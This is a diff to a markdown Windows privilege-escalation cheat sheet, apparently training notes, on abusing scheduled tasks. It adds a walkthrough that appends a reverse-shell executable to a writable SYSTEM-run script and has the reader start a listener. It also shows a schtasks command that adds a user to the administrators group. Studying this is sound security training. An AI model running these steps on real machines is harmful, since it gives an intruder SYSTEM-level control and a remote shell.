@@ -32,9 +32,26 @@ Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
 
 ## Scheduled Tasks
 
+^bf7821
+
+Windows can be configured to run tasks at specific
+times, periodically (e.g. every 5 mins) or when triggered
+by some event (e.g. a user logon).
+Tasks usually run with the privileges of the user who
+created them, however administrators can configure
+tasks to run as other users, including SYSTEM
+
 **Tasks** can be schedules to run with **certain frequency**. See which binaries are scheduled to run with:
 
 ```bash
+# List all scheduled tasks your user can see:
+schtasks /query /fo LIST /v
+
+#In PowerShell:
+PS> Get-ScheduledTask | where {$_.TaskPath -notlike
+"\Microsoft*"} | ft TaskName,TaskPath,State
+
+
 schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
 schtasks /query /fo LIST 2>nul | findstr TaskName
 schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
@@ -45,7 +62,20 @@ Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,Tas
 schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators user /add"
 ```
 
-## Folders
+Unfortunately, there is no easy method for enumerating custom tasks that belong to other users as a low privileged user account Often we have to rely on other clues, such as finding a script or log file that indicates a scheduled task is being run.
+
+1. In the C:\DevTools directory, there is a PowerShell script called
+“CleanUp.ps1”. View the script:
+`type C:\DevTools\CleanUp.ps1`
+
+2. This script seems like it is running every minute as the SYSTEM user. We can check our privileges on this script using accesschk.exe:
+`C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1`
+3. Backup the script:
+`copy C:\DevTools\CleanUp.ps1 C:\Temp\`
+4. Start a listener on Kali.
+5. Use echo to append a call to our reverse shell executable to the end of the script:
+`echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1`
+6. Wait for the scheduled task to run (it should run every minute) to complete the exploit.
 
 All the binaries located in the **Startup folders are going to be executed on startup**. The common startup folders are the ones listed a continuation, but the startup folder is indicated in the registry. [Read this to learn where.](privilege-escalation-with-autorun-binaries.md#startup-path)
 
